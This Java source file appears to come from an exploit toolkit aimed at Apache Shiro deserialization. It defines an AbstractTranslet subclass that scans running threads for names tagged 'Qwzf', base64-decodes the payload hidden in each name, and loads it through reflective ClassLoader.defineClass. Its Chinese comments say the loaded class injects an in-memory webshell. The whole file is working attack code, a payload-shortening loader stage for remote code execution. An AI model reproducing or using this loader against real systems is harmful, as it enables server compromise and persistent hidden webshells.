package org.exploit.third.shiro.shortenPayload;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Field;

//搭配ThreadName使用
public class ThreadLoader extends AbstractTranslet {
    public ThreadLoader() throws Exception{
        ThreadGroup a = Thread.currentThread().getThreadGroup();
        Field v2 = a.getClass().getDeclaredField("threads");
        v2.setAccessible(true);
        Thread[] o = (Thread[]) v2.get(a);
        for (int i = 0; i < o.length; ++i) {
            Thread z = o[i];
            //使用ClassLoader类的defineClass方法加载具有Qwzf标识的Thread name中的Payload
            if (z.getName().contains("Qwzf")) {
                byte[] bytes2 = new sun.misc.BASE64Decoder().decodeBuffer(z.getName().replaceAll("Qwzf", ""));
                //反射获取ClassLoader类的defineClass方法
                java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
                defineClassMethod.setAccessible(true);
                //反射调用defineClass方法加载Thread name中的注入内存马的类字节码
                Class clazz = (Class) defineClassMethod.invoke(ThreadLoader.class.getClassLoader(), bytes2, 0, bytes2.length);
                clazz.newInstance();
            }
        }
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}